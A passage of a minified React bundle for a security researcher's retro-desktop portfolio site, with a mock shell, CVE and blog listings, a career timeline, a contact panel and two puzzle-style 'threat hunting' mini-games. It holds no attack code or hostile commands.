i.jsxs("div",{className:"an",children:[i.jsxs("div",{className:"ls",children:[i.jsx("div",{className:"search",children:i.jsx("input",{value:t,onChange:c=>s(c.target.value),placeholder:"search posts…",spellCheck:!1})}),o.map(c=>i.jsxs("div",{className:`it ${c.slug===a?"on":""}`,onClick:()=>r(c.slug),children:[i.jsx("div",{className:"ttl",children:c.title}),i.jsxs("div",{className:"mt",children:[i.jsx("span",{children:c.date}),i.jsx("span",{children:"·"}),i.jsx("span",{children:c.readTime}),i.jsxs("span",{className:"tg",children:["[",c.category,"]"]})]})]},c.slug)),o.length===0&&i.jsx("div",{className:"it",style:{color:"var(--mut)"},children:"no matches"})]}),i.jsx("div",{className:"dt",children:l&&i.jsxs(i.Fragment,{children:[i.jsx("h1",{children:l.title}),i.jsxs("div",{className:"mt",children:[l.date," · ",l.readTime," · ",l.category]}),i.jsx("div",{className:"bd",children:i.jsx("p",{children:l.excerpt})}),i.jsx("div",{className:"max",onClick:()=>n&&n(l.slug),children:"⤢ Maximize — read full post"})]})})]})}function fc(e){return Lt[e.title]||{code:e.title.split(" ").map(n=>n[0]).join("").slice(0,4).toUpperCase(),status:"—",metric:"—",stack:e.tags||[]}}function tp({initialTitle:e}){const[n,t]=g.useState(null);if(g.useEffect(()=>{if(e){const s=Mn.findIndex(a=>a.title===e);s>=0&&t(s)}else t(null)},[e]),n!==null){const s=Mn[n],a=fc(s);return i.jsx("div",{className:"af",children:i.jsxs("div",{className:"pdr",children:[i.jsx("button",{type:"button",className:"bk bk-button",onClick:()=>t(null),children:"← projects"}),i.jsx("h2",{children:s.title}),i.jsxs("div",{className:"ct",children:[a.code," · ",(s.tags||[]).join(" / ")," · ",a.status]}),i.jsx("p",{className:"bl",children:s.description}),i.jsxs("div",{className:"sp",children:[i.jsxs("div",{className:"s",children:[i.jsx("div",{className:"l",children:"METRIC"}),i.jsx("div",{className:"v",children:a.metric})]}),i.jsxs("div",{className:"s",children:[i.jsx("div",{className:"l",children:"STATUS"}),i.jsx("div",{className:"v",children:a.status})]})]}),i.jsx("div",{className:"sk",children:a.stack.map(r=>i.jsx("span",{className:"ch",children:r},r))}),s.href&&s.href!=="#"&&i.jsx("p",{style:{marginTop:18},children:i.jsxs("a",{href:s.href,target:"_blank",rel:"noreferrer",style:{color:"var(--acc2)",fontFamily:"var(--mono)",fontSize:12},children:[s.href," →"]})})]})})}return i.jsxs("div",{className:"af",children:[i.jsx("div",{className:"tb2",children:i.jsxs("div",{className:"crm",children:["/home/hem",i.jsx("span",{className:"sp",children:"›"}),"projects"]})}),i.jsx("div",{className:"grd",children:Mn.map((s,a)=>{const r=fc(s);return i.jsxs("div",{className:"fi",onClick:()=>t(a),children:[i.jsx("div",{className:"ic",children:s.title[0]}),i.jsx("div",{className:"ttl",children:s.title}),i.jsxs("div",{className:"sz",children:[r.code," · ",(s.tags||[])[0]||"—"]})]},s.title)})})]})}const Eg=`  _   _ _____ __  __        ___  ____
 | | | | ____|  \\/  |      / _ \\/ ___|
 | |_| |  _| | |\\/| |____ | | | \\___ \\
 |  _  | |___| |  | |____|| |_| |___) |
 |_| |_|_____|_|  |_|       \\___/|____/`,Ai=["node-hunt","packet-intercept","malware-maze"],_g=["~","~/projects","~/writing","~/cves"],Ng=["help","whoami","ls","cd","pwd","cves","cat","open","play","fortune","clear","exit"];function Cg(e,n){if(!e||e==="~"||e==="/"||e==="/home/hem")return"~";if(e===".."){if(n==="~")return"~";const s=n.split("/");return s.pop(),s.join("/")||"~"}let t;return e.startsWith("~/")?t=e:e.startsWith("/home/hem/")?t="~/"+e.slice(10):t=n==="~"?`~/${e}`:`${n}/${e}`,t=t.replace(/\/$/,""),_g.includes(t)?t:null}function jg(e){return e==="~"?"about.txt  .now  manifesto.md  projects/  writing/  cves/":e==="~/projects"?Mn.map(n=>{var t;return((t=Lt[n.title])==null?void 0:t.code)||n.title.split(" ").map(s=>s[0]).join("").toUpperCase()}).join("  "):e==="~/writing"?ke.map(n=>n.slug).join("  "):e==="~/cves"?xt.map(n=>n.id).join("  "):"(empty)"}function Lg(e,n,t){var d;const s=[{type:"in",t:e,cwd:n}];let a=n,r=null,o=!1;const l=e.trim().split(/\s+/),c=l[0];if(c)if(c==="help")s.push({type:"em",t:"available: help, whoami, ls, cd, pwd, cves, cat <file>, open <app>, play <game>, fortune, clear, exit"},{type:"dm",t:"files: about.txt, .now, manifesto.md, cve <ID>"},{type:"dm",t:"dirs:  ~, ~/projects, ~/writing, ~/cves"},{type:"dm",t:"chain commands with && · Tab to complete"});else if(c==="whoami")s.push({type:"em",t:`${le.name} — ${le.role}`},{type:"dm",t:`${le.current} · ${le.location}`});else if(c==="ls")s.push({type:"em",t:jg(n)});else if(c==="pwd")s.push({type:"em",t:n==="~"?"/home/hem":`/home/hem/${n.slice(2)}`});else if(c==="cd"){const m=l[1],p=Cg(m,n);p===null?(s.push({type:"bd",t:`cd: ${m}: no such directory`}),o=!0):(a=p,p!==n&&s.push({type:"dm",t:`→ ${p}`}))}else if(c==="cves")s.push({type:"em",t:"ID                 TARGET                  CLASS                  YEAR  ROLE"}),xt.forEach(m=>{s.push({type:"ln",t:`${m.id.padEnd(18)} ${(m.target||"").padEnd(23)} ${(m.class||"").padEnd(22)} ${m.year}  study`})});else if(c==="cat"){const m=l[1];if(!m)s.push({type:"bd",t:"cat: missing operand"}),o=!0;else if(m==="about.txt"||m==="about")s.push({type:"em",t:`${le.name} · ${le.role}
${le.current} · ${le.location}
`});else if(m===".now")Qd.forEach(p=>s.push({type:"ln",t:`▸ ${p}`}));else if(m==="manifesto.md")oa.forEach(p=>s.push({type:"ln",t:`${p.k} ${p.v}`}));else if(m==="cve"){const p=l[2];if(!p)s.push({type:"bd",t:"cat: cve: missing CVE id"}),o=!0;else{const v=xt.find(b=>b.id.toLowerCase()===p.toLowerCase());v?s.push({type:"em",t:`${v.id}
  target: ${v.target}
  class:  ${v.class}
  year:   ${v.year}
  blog:   /blog/${v.slug}`}):(s.push({type:"bd",t:`cat: cve ${p}: not found`}),o=!0)}}else if(n==="~/projects"){const p=Mn.find(v=>{const b=Lt[v.title];return(b==null?void 0:b.code)&&b.code.toLowerCase()===m.toLowerCase()||v.title.toLowerCase()===m.toLowerCase()});if(p){const v=Lt[p.title]||{};s.push({type:"em",t:`${v.code||"—"} — ${p.title}`}),s.push({type:"dm",t:`${v.status||"—"} · ${(p.tags||[]).join(" / ")}`}),s.push({type:"ln",t:p.description}),v.metric&&s.push({type:"ln",t:`metric: ${v.metric}`}),(d=v.stack)!=null&&d.length&&s.push({type:"ln",t:`stack:  ${v.stack.join(", ")}`}),p.href&&p.href!=="#"&&s.push({type:"lk",t:p.href})}else s.push({type:"bd",t:`cat: ${m}: no such project`}),o=!0}else if(n==="~/writing"){const p=ke.find(v=>v.slug.toLowerCase()===m.toLowerCase());p?(s.push({type:"em",t:p.title}),s.push({type:"dm",t:`${p.date} · ${p.readTime} · [${p.category}]`}),s.push({type:"ln",t:p.excerpt}),s.push({type:"dm",t:`// read: /blog/${p.slug}`})):(s.push({type:"bd",t:`cat: ${m}: no such writing`}),o=!0)}else if(n==="~/cves"){const p=xt.find(v=>v.id.toLowerCase()===m.toLowerCase());p?s.push({type:"em",t:`${p.id}
  target: ${p.target}
  class:  ${p.class}
  year:   ${p.year}
  blog:   /blog/${p.slug}`}):(s.push({type:"bd",t:`cat: ${m}: not found in cves/`}),o=!0)}else s.push({type:"bd",t:`cat: ${m}: No such file`}),o=!0}else if(c==="open"){const m=l[1];m&&_e[m]?(t.onLaunch&&t.onLaunch(m),s.push({type:"dm",t:`opening ${m}…`})):(s.push({type:"bd",t:`open: ${m||"(no app)"}: unknown app`}),o=!0)}else if(c==="play"){const m=l[1];m&&Ai.includes(m)?(t.onLaunch&&t.onLaunch("games",{initialGame:m}),s.push({type:"dm",t:`loading ${m}…`})):(s.push({type:"bd",t:`play: ${m||"(no game)"}: unknown. try: ${Ai.join(", ")}`}),o=!0)}else if(c==="fortune"){const m=oa[Math.floor(Math.random()*oa.length)];m&&s.push({type:"wn",t:`❝ ${m.v} ❞`})}else c==="clear"?r="clear":c==="exit"?r="exit":(s.push({type:"bd",t:`${c}: command not found`}),o=!0);return{out:s,newCwd:a,side:r,halt:o}}function Ag(e,n){const t=/\s$/.test(e),s=e.trimEnd(),a=s.length?s.split(/\s+/):[],r=t?a.length:Math.max(0,a.length-1),o=t?"":a[a.length-1]||"",l=d=>(d||"").toLowerCase();if(r===0)return Ng.filter(d=>d.startsWith(o));const c=a[0];if(c==="cd")return(n==="~"?["projects","writing","cves","..","~"]:["..","~"]).filter(m=>m.startsWith(o));if(c==="cat"){if(r===1){let d=[];return n==="~"?d=["about.txt",".now","manifesto.md","cve"]:n==="~/projects"?d=Mn.map(m=>{var p;return(p=Lt[m.title])==null?void 0:p.code}).filter(Boolean):n==="~/writing"?d=ke.map(m=>m.slug):n==="~/cves"&&(d=xt.map(m=>m.id)),d.filter(m=>l(m).startsWith(l(o)))}return r===2&&a[1]==="cve"?xt.map(d=>d.id).filter(d=>l(d).startsWith(l(o))):[]}return c==="open"?Object.keys(_e).filter(d=>d.startsWith(o)):c==="play"?Ai.filter(d=>d.startsWith(o)):[]}function Pg(e){if(!e.length)return"";let n=e[0];for(let t=1;t<e.length;t++)for(;n&&!e[t].toLowerCase().startsWith(n.toLowerCase());)n=n.slice(0,-1);return n}function gc(e,n){if(/\s$/.test(e))return e+n;const s=e.lastIndexOf(" ");return(s===-1?"":e.slice(0,s+1))+n}function sp({runOnOpen:e,runOnOpenNonce:n,onLaunch:t}){const[s,a]=g.useState([{type:"ban",t:Eg},{type:"dm",t:"HEM-OS 1.7.0 — type 'help' to begin."}]),[r,o]=g.useState(""),[l,c]=g.useState([]),[d,m]=g.useState(-1),[p,v]=g.useState("~"),b=g.useRef(null),w=g.useRef(null),y=g.useRef("");g.useEffect(()=>{b.current&&(b.current.scrollTop=b.current.scrollHeight)},[s]);const T=(u,h)=>{const x=u.split(/\s*&&\s*/).filter(O=>O.trim());let k=h,E=[],C=!1,L=!1;for(const O of x){const{out:R,newCwd:B,side:K,halt:X}=Lg(O,k,{onLaunch:t});if(K==="clear"){C=!0,E=[],k=B;continue}if(K==="exit"){L=!0;break}if(E.push(...R),k=B,X)break}if(L){window.dispatchEvent(new Event("hemos-close-term"));return}C?a(E):E.length&&a(O=>[...O,...E]),k!==h&&v(k)};g.useEffect(()=>{e&&T(e,p)},[e,n]);const f=u=>{if(u.key==="Enter")r.trim()&&(c(h=>[...h,r]),m(-1),y.current="",T(r,p)),o("");else if(u.key==="ArrowUp"){if(u.preventDefault(),l.length){d<0&&(y.current=r);const h=d<0?l.length-1:Math.max(0,d-1);m(h),o(l[h])}}else if(u.key==="ArrowDown"){if(u.preventDefault(),d>=0){const h=d+1;h>=l.length?(m(-1),o(y.current),y.current=""):(m(h),o(l[h]))}}else if(u.key==="Tab"){u.preventDefault();const h=Ag(r,p);if(h.length===0)return;if(h.length===1){o(gc(r,h[0]+" "));return}const x=/\s$/.test(r),k=r.lastIndexOf(" "),E=x?"":k===-1?r:r.slice(k+1),C=Pg(h);C.length>E.length&&o(gc(r,C)),a(L=>[...L,{type:"dm",t:h.join("  ")}])}};return i.jsxs("div",{className:"at",ref:b,onClick:()=>w.current&&w.current.focus(),children:[s.map((u,h)=>u.type==="ban"?i.jsx("pre",{className:"ban",children:u.t},h):u.type==="in"?i.jsxs("div",{className:"ln",children:[i.jsxs("span",{className:"pp",children:["hem@hemos:",u.cwd||"~","$"]})," ",u.t]},h):i.jsx("div",{className:`ln ${u.type}`,children:u.t},h)),i.jsxs("div",{className:"il",children:[i.jsxs("span",{className:"pp",children:["hem@hemos:",p,"$"]}),i.jsx("input",{ref:w,className:"ip",autoFocus:!0,value:r,onChange:u=>o(u.target.value),onKeyDown:f,spellCheck:!1})]})]})}function ap(){return i.jsxs("div",{className:"atm",children:[i.jsx("h1",{children:"Career Trajectory"}),i.jsxs("div",{className:"sb",children:["// ",pc.length," stops · ",hc.length," certifications"]}),i.jsx("div",{className:"tl",children:pc.map((e,n)=>{const t=e.range.toLowerCase().includes("present");return i.jsxs("div",{className:`stop ${t?"cur":""}`,children:[i.jsx("div",{className:"rg",children:e.range}),i.jsxs("div",{className:"ro",children:[e.role,t&&i.jsx("span",{className:"pil",children:"NOW"})]}),i.jsx("div",{className:"or",children:e.org}),i.jsx("div",{className:"bl",children:e.desc})]},n)})}),i.jsx("h2",{style:{fontFamily:"var(--mono)",fontSize:11,color:"var(--mut)",letterSpacing:".16em",textTransform:"uppercase",margin:"22px 0 10px"},children:"// CERTIFICATIONS"}),i.jsx("div",{className:"cg",children:hc.map((e,n)=>i.jsxs("a",{className:"ce",href:e.href,target:"_blank",rel:"noreferrer",children:[i.jsx("div",{className:"t",children:e.title}),i.jsxs("div",{className:"m",children:[e.iss," · ",e.y]})]},n))})]})}function rp(){return i.jsxs("div",{className:"am",children:[i.jsxs("div",{className:"sd",children:[i.jsx("div",{className:"gl",children:"Mailbox"}),i.jsxs("div",{className:"it on",children:["Inbox ",i.jsx("span",{className:"ct",children:"1"})]}),i.jsx("div",{className:"it",children:"Sent"}),i.jsx("div",{className:"gl",children:"Channels"}),mc.map(e=>i.jsxs("a",{className:"it",href:e.href,target:"_blank",rel:"noreferrer",style:{textDecoration:"none"},children:[e.label,i.jsx("span",{className:"ct",children:e.handle})]},e.label))]}),i.jsxs("div",{className:"mn",children:[i.jsx("h1",{children:"Get in touch."}),i.jsx("div",{className:"fr",children:"From: hem@hemos · To: you@anywhere"}),i.jsxs("div",{className:"bd",children:[i.jsxs("p",{children:["Fastest path:"," ",i.jsx("a",{href:`mailto:${le.email}`,style:{color:"var(--acc2)"},children:le.email})]}),i.jsxs("p",{children:["I'm in ",le.location," (",le.tz,"). Open to: security research collabs, hiring conversations, paper reviews, and lab tours."]}),i.jsx("p",{style:{color:"var(--mut)",fontFamily:"var(--mono)",fontSize:12},children:"// PGP key on request. I read DMs eventually."})]}),i.jsx("div",{className:"sg",children:mc.map(e=>i.jsxs("a",{href:e.href,target:"_blank",rel:"noreferrer",children:[i.jsx("span",{children:e.label}),i.jsxs("span",{children:[e.handle," →"]})]},e.label))})]})]})}function ip(){const[e,n]=g.useState(0);g.useEffect(()=>{const a=setInterval(()=>n(r=>r+1),1500);return()=>clearInterval(a)},[]);const t=(a,r)=>Math.max(5,Math.min(95,a+Math.sin((e+r)*.6)*8)),s=[{label:"cpu / curiosity-d",base:72,off:0},{label:"mem / writing-cache",base:58,off:1},{label:"net / signal-strength",base:80,off:2},{label:"focus / shipping",base:64,off:3}];return i.jsxs("div",{className:"asy",children:[i.jsx("h1",{children:"system_monitor"}),i.jsx("div",{className:"sb",children:"// hem@hemos · uptime: stable since 2018"}),i.jsx("div",{className:"gg",children:s.map(a=>{const r=t(a.base,a.off);return i.jsxs("div",{className:"gu",children:[i.jsxs("div",{className:"l",children:[i.jsx("span",{children:a.label}),i.jsxs("span",{className:"v",children:[r.toFixed(0),"%"]})]}),i.jsx("div",{className:"br",children:i.jsx("div",{className:"f",style:{width:r+"%"}})})]},a.label)})}),i.jsx("h2",{children:"// processes / now"}),i.jsx("ul",{className:"nl",children:Qd.map((a,r)=>i.jsx("li",{children:a},r))})]})}const Ye=5,vc={easy:{scanLimit:3,hintThresholds:[1,3]},standard:{scanLimit:2,hintThresholds:[2,4]},hard:{scanLimit:1,hintThresholds:[3,5]}},ft=Array.from({length:Ye},(e,n)=>String.fromCharCode(65+n)),Ig=new Set(["reverse","engineering","from","with","into","watchguard","firebox","kernel","linux","audit","transient","scheduler","attacks","understanding","cve","blog","server","tiny","fake"]),yc=()=>{const e={};for(let n=1;n<=Ye;n+=1)for(let t=0;t<Ye;t+=1){const s=`${ft[t]}${n}`;e[s]={status:"unknown",heat:""}}return e},Mg=e=>{const s=(e||"").toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean).find(a=>a.length>4&&!Ig.has(a));return s?s.toUpperCase():"SIGNAL"},wc=e=>{const n=e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown intruder",year:"Unknown",severity:"Unknown",summary:"",href:""},t=Math.floor(Math.random()*Ye),s=Math.floor(Math.random()*Ye);return{entry:n,colIndex:t,rowIndex:s,key:`${ft[t]}${s+1}`}},Rg=e=>e===0?{label:"direct",text:"Direct signal. Confirm with ISOLATE."}:e<=1?{label:"hot",text:"Signal spike detected."}:e<=2?{label:"warm",text:"Signal is warm."}:e<=3?{label:"cool",text:"Signal is faint."}:{label:"cold",text:"Signal cold."},jr=e=>[{type:"system",text:"NODE HUNT // Threat hunting console online."},{type:"system",text:"Type HELP to see commands."},{type:"info",text:`Grid ${Ye}x${Ye} loaded. Scan budget: ${e}.`}];function Og({entries:e=[],difficulty:n="standard"}){var H,M,_;const t=vc[n]||vc.standard,[s,a]=g.useState(()=>yc()),[r,o]=g.useState(()=>wc(e)),[l,c]=g.useState(()=>jr(t.scanLimit)),[d,m]=g.useState(""),[p,v]=g.useState(0),[b,w]=g.useState(0),[y,T]=g.useState(t.scanLimit),[f,u]=g.useState("active"),h=g.useRef(null),x=g.useMemo(()=>{var S,N,P,q;return{year:((S=r.entry)==null?void 0:S.year)||"Unknown",severity:((N=r.entry)==null?void 0:N.severity)||"Unknown",keyword:Mg(`${((P=r.entry)==null?void 0:P.title)||""} ${((q=r.entry)==null?void 0:q.summary)||""}`)}},[r]);g.useEffect(()=>{h.current&&(h.current.scrollTop=h.current.scrollHeight)},[l]);const k=(S,N="info")=>{c(P=>[...P,{type:N,text:S}])},E=()=>{a(yc()),o(wc(e)),v(0),w(0),T(t.scanLimit),u("active"),c([...jr(t.scanLimit),{type:"system",text:"New hunt initialized."}])};g.useEffect(()=>{E()},[n]);const C=S=>{const N=S==null?void 0:S.toUpperCase().match(/^([A-Z])(\d+)$/);if(!N)return null;const P=N[1],q=Number(N[2]),U=ft.indexOf(P);return U===-1||!Number.isFinite(q)||q<1||q>Ye?null:{key:`${P}${q}`,colIndex:U,rowIndex:q-1}},L=S=>{const[N,P]=t.hintThresholds;b===0&&S>=N?(w(1),k(`Hint: Signal spikes in row ${r.rowIndex+1}.`,"hint")):b===1&&S>=P&&(w(2),k(`Hint: Signal concentrates in column ${ft[r.colIndex]}.`,"hint"))},O=()=>{if(y<=0){k("Scan budget depleted. Use PING or TRACE.","warning");return}T(P=>Math.max(P-1,0));const S=r.rowIndex<Ye/2?"NORTH":"SOUTH",N=r.colIndex<Ye/2?"WEST":"EAST";k(`Scan result: signal cluster in ${S}-${N} quadrant.`,"info")},R=S=>{const N=Math.abs(S.colIndex-r.colIndex)+Math.abs(S.rowIndex-r.rowIndex),P=Rg(N);a(q=>({...q,[S.key]:{status:"ping",heat:P.label}})),k(`Ping ${S.key}: ${P.text}`,"info")},B=S=>{const N=r.rowIndex===S.rowIndex?"SAME ROW":r.rowIndex<S.rowIndex?"NORTH":"SOUTH",P=r.colIndex===S.colIndex?"SAME COLUMN":r.colIndex<S.colIndex?"WEST":"EAST",q=N==="SAME ROW"&&P==="SAME COLUMN"?"LOCK POSSIBLE":N==="SAME ROW"?P:P==="SAME COLUMN"?N:`${N}-${P}`;a(U=>({...U,[S.key]:{status:"trace",heat:""}})),k(`Trace ${S.key}: target heading ${q}.`,"info")},K=S=>{var P;const N=p+1;if(v(N),S.key===r.key){a(q=>({...q,[S.key]:{status:"hit",heat:"hot"}})),u("found"),k(`Target isolated at ${S.key}.`,"success"),k(`Identity confirmed: ${((P=r.entry)==null?void 0:P.id)||"Unknown"}.`,"success");return}a(q=>({...q,[S.key]:{status:"miss",heat:"cold"}})),k(`Isolate ${S.key}: no match.`,"warning"),L(N)},X=S=>{var ee;const N=S.trim();if(!N)return;k(`> ${N}`,"command");const[P,q]=N.split(/\s+/),U=P.toLowerCase(),ue=q||"";if(f==="found"&&!["restart","help","clear","open"].includes(U)){k("Case closed. Type RESTART to hunt again.","system");return}if(U==="help"){k("Commands: SCAN, PING A1, TRACE B2, ISOLATE C3, OPEN, CLEAR, RESTART.","system");return}if(U==="scan"){O();return}if(U==="clear"){c([...jr(t.scanLimit),{type:"system",text:"Console cleared."}]);return}if(U==="restart"){E();return}if(U==="open"){if(f!=="found"||!((ee=r.entry)!=null&&ee.href)){k("No report unlocked yet.","warning");return}window.open(r.entry.href,"_blank","noreferrer"),k("Opening report in new tab.","system");return}if(["ping","trace","isolate"].includes(U)){const ye=C(ue);if(!ye){k("Invalid coordinate. Example: PING B2.","error");return}U==="ping"&&R(ye),U==="trace"&&B(ye),U==="isolate"&&K(ye);return}k("Unknown command. Type HELP.","error")},I=S=>{S.preventDefault(),X(d),m("")},D=S=>S.status==="hit"?"@":S.status==="miss"?"x":S.status==="trace"?"+":S.status==="ping"?"o":".";return i.jsxs("div",{className:"hunt-layout",children:[i.jsxs("div",{className:`hunt-terminal ${f==="found"?"win":""}`,children:[i.jsxs("div",{className:"terminal-header",children:[i.jsxs("div",{children:[i.jsx("div",{className:"terminal-title",children:"NODE HUNT"}),i.jsx("div",{className:"terminal-subtitle",children:"Threat hunting simulation"})]}),i.jsx("div",{className:`terminal-status ${f}`,children:f==="found"?"SECURED":"ACTIVE"})]}),i.jsxs("div",{className:"hunt-onboarding",children:[i.jsx("div",{className:"onboarding-title",children:"How to play"}),i.jsxs("div",{className:"onboarding-steps",children:[i.jsxs("div",{children:["1. SCAN (",t.scanLimit,"x) to get the quadrant."]}),i.jsx("div",{children:"2. PING A1 for heat distance."}),i.jsx("div",{children:"3. TRACE B2 for direction."}),i.jsx("div",{children:"4. ISOLATE when you are confident."})]}),i.jsx("div",{className:"onboarding-hint",children:"Try: SCAN, PING B2, TRACE C4, ISOLATE D5."})]}),i.jsx("div",{className:"terminal-log",ref:h,children:l.map((S,N)=>i.jsx("div",{className:`terminal-line ${S.type}`,children:S.text},`${S.type}-${N}`))}),i.jsxs("form",{className:"terminal-input",onSubmit:I,children:[i.jsx("span",{className:"terminal-prompt",children:"nodehunt>"}),i.jsx("input",{type:"text",value:d,onChange:S=>m(S.target.value),placeholder:"Type a command (HELP)","aria-label":"Terminal command"}),i.jsx("button",{className:"pill",type:"submit",children:"Run"})]})]}),i.jsxs("div",{className:`hunt-board ${f==="found"?"win":""}`,children:[i.jsxs("div",{className:"hunt-intel",children:[i.jsx("div",{className:"intel-title",children:"Signal fingerprint"}),i.jsxs("div",{className:"intel-row",children:[i.jsx("span",{children:"Year"}),i.jsx("span",{children:x.year})]}),i.jsxs("div",{className:"intel-row",children:[i.jsx("span",{children:"Severity"}),i.jsx("span",{children:x.severity})]}),i.jsxs("div",{className:"intel-row",children:[i.jsx("span",{children:"Codename"}),i.jsx("span",{children:x.keyword})]}),i.jsxs("div",{className:"intel-row",children:[i.jsx("span",{children:"Attempts"}),i.jsx("span",{children:p})]}),i.jsxs("div",{className:"intel-row",children:[i.jsx("span",{children:"Scans left"}),i.jsx("span",{children:y})]})]}),i.jsxs("div",{className:"hunt-grid",children:[i.jsxs("div",{className:"grid-row",children:[i.jsx("div",{className:"grid-cell header"}),ft.map(S=>i.jsx("div",{className:"grid-cell header",children:S},S))]}),Array.from({length:Ye}).map((S,N)=>i.jsxs("div",{className:"grid-row",children:[i.jsx("div",{className:"grid-cell header",children:N+1}),ft.map(P=>{const q=`${P}${N+1}`,U=s[q],ue=U.heat?`heat-${U.heat}`:"";return i.jsx("div",{className:`grid-cell cell ${U.status} ${ue}`,children:D(U)},q)})]},`row-${N}`))]}),i.jsxs("div",{className:"hunt-legend",children:[i.jsxs("div",{children:[i.jsx("span",{className:"legend-symbol",children:"."})," unknown"]}),i.jsxs("div",{children:[i.jsx("span",{className:"legend-symbol",children:"o"})," ping"]}),i.jsxs("div",{children:[i.jsx("span",{className:"legend-symbol",children:"+"})," trace"]}),i.jsxs("div",{children:[i.jsx("span",{className:"legend-symbol",children:"x"})," miss"]}),i.jsxs("div",{children:[i.jsx("span",{className:"legend-symbol",children:"@"})," capture"]})]}),f==="found"&&i.jsxs("div",{className:"hunt-result",children:[i.jsx("div",{className:"hunt-result-title",children:"Intruder identified"}),i.jsx("div",{className:"hunt-result-id",children:((H=r.entry)==null?void 0:H.id)||"Unknown"}),i.jsx("p",{className:"hunt-result-text",children:(M=r.entry)==null?void 0:M.title}),((_=r.entry)==null?void 0:_.href)&&i.jsx("a",{className:"button primary",href:r.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]})]})}const on=["Alpha","Bravo","Charlie"],bc={easy:{scanBase:3,scanAfterMiss:2,missPenaltyAt:3,captureGoal:2},standard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:2,captureGoal:3},hard:{scanBase:2,scanAfterMiss:1,missPenaltyAt:1,captureGoal:4}},qg=e=>bc[e]||bc.standard,Vs=(e,n)=>e>=n.missPenaltyAt?n.scanAfterMiss:n.scanBase,Lr=e=>e.length?e[Math.floor(Math.random()*e.length)]:{id:"UNKNOWN",title:"Unknown packet stream",year:"Unknown",severity:"Unknown",summary:"",href:""},Ar=e=>{const t=(((e==null?void 0:e.id)||(e==null?void 0:e.title)||"").match(/\d/g)||[]).reduce((s,a)=>s+Number(a),0);return Number.isFinite(t)?t%10:Math.floor(Math.random()*10)},Ht=(e,n)=>Math.floor(Math.random()*(n-e+1))+e,Gs=e=>{const n=Math.floor(Math.random()*on.length);return{packets:on.map((s,a)=>{const r=a===n?e:Ht(0,9),o=a===n?Ht(70,96):Ht(25,75);return{lane:s,checksum:r===e&&a!==n?(r+1)%10:r,latency:Ht(18,90),burst:Ht(2,9),risk:o}}),maliciousLane:n}},Pr=e=>[{type:"system",text:"PACKET INTERCEPT // Traffic control engaged."},{type:"system",text:"Inspect lanes, then intercept the hostile payload."},{type:"info",text:`Scan budget: ${e.scanBase} per round. Misses drop it to ${e.scanAfterMiss}.`}];function Dg({entries:e=[],difficulty:n="standard"}){const t=qg(n),[s,a]=g.useState(()=>Lr(e)),[r,o]=g.useState(()=>Ar(s)),[l,c]=g.useState(()=>Gs(r)),[d,m]=g.useState(()=>on.map(()=>!1)),[p,v]=g.useState(0),[b,w]=g.useState(0),[y,T]=g.useState(()=>Vs(0,t)),[f,u]=g.useState("active"),[h,x]=g.useState(()=>Pr(t)),[k,E]=g.useState(null),C=g.useRef(null),L=g.useMemo(()=>({year:(s==null?void 0:s.year)||"Unknown",severity:(s==null?void 0:s.severity)||"Unknown",signature:r}),[s,r]);g.useEffect(()=>{C.current&&(C.current.scrollTop=C.current.scrollHeight)},[h]),g.useEffect(()=>{if(!e.length)return;const I=Lr(e),D=Ar(I);a(I),o(D),c(Gs(D)),m(on.map(()=>!1)),v(0),w(0),T(Vs(0,t)),E(null),u("active"),x([...Pr(t),{type:"system",text:"New traffic signature loaded."}])},[e,n]);const O=(I,D="info")=>{x(H=>[...H,{type:D,text:I}])},R=(I=b)=>{c(Gs(r)),m(on.map(()=>!1)),T(Vs(I,t)),E(null)},B=()=>{const I=Lr(e),D=Ar(I);a(I),o(D),c(Gs(D)),m(on.map(()=>!1)),v(0),w(0),T(Vs(0,t)),E(null),u("active"),x([...Pr(t),{type:"system",text:"New case file opened."}])},K=I=>{if(f!=="found"&&!d[I]){if(y<=0){O("Scan budget exhausted. Intercept to continue.","warning");return}m(D=>D.map((H,M)=>M===I?!0:H)),T(D=>D-1),O(`Scan lane ${on[I].toUpperCase()}: checksum surfaced.`,"info")}},X=I=>{if(f==="found")return;const D=I===l.maliciousLane;if(E({lane:I,hit:D}),D){const H=p+1;if(v(H),O(`Intercept success on ${on[I].toUpperCase()}.`,"success"),H>=t.captureGoal){u("found"),O("Threat chain neutralized.","success");return}R(b)}else{const H=b+1;w(H),O(`False positive on ${on[I].toUpperCase()}.`,"warning"),R(H)}};return i.jsxs("div",{className:"intercept-layout",children:[i.jsxs("div",{className:"intercept-panel",children:[i.jsxs("div",{className:"intercept-header",children:[i.jsxs("div",{children:[i.jsx("div",{className:"intercept-title",children:"Packet Intercept"}),i.jsx("div",{className:"intercept-subtitle",children:"Scan lanes, then trigger quarantine."})]}),i.jsx("div",{className:`intercept-status ${f}`,children:f==="found"?"SECURED":"ACTIVE"})]}),i.jsxs("div",{className:"intercept-intel",children:[i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Signature"}),i.jsx("span",{children:L.signature})]}),i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Year"}),i.jsx("span",{children:L.year})]}),i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Severity"}),i.jsx("span",{children:L.severity})]}),i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Captures"}),i.jsxs("span",{children:[p,"/",t.captureGoal]})]}),i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Misses"}),i.jsx("span",{children:b})]}),i.jsxs("div",{className:"intercept-intel-row",children:[i.jsx("span",{children:"Scans left"}),i.jsx("span",{children:y})]})]}),i.jsx("div",{className:"intercept-hint",children:"Match the checksum to the signature. Scan reveals lane data."}),i.jsxs("div",{className:"intercept-actions",children:[i.jsx("button",{className:"pill",type:"button",onClick:R,children:"New packet"}),i.jsx("button",{className:"pill",type:"button",onClick:B,children:"New case"}),f==="found"&&(s==null?void 0:s.href)&&i.jsx("a",{className:"button primary",href:s.href,target:"_blank",rel:"noreferrer",children:"Open report"})]}),i.jsx("div",{className:"intercept-log",ref:C,children:h.map((I,D)=>i.jsx("div",{className:`intercept-line ${I.type}`,children:I.text},`${I.type}-${D}`))}),f==="found"&&i.jsxs("div",{className:"intercept-result",children:[i.jsx("div",{className:"intercept-result-title",children:"Threat captured"}),i.jsx("div",{className:"intercept-result-id",children:(s==null?void 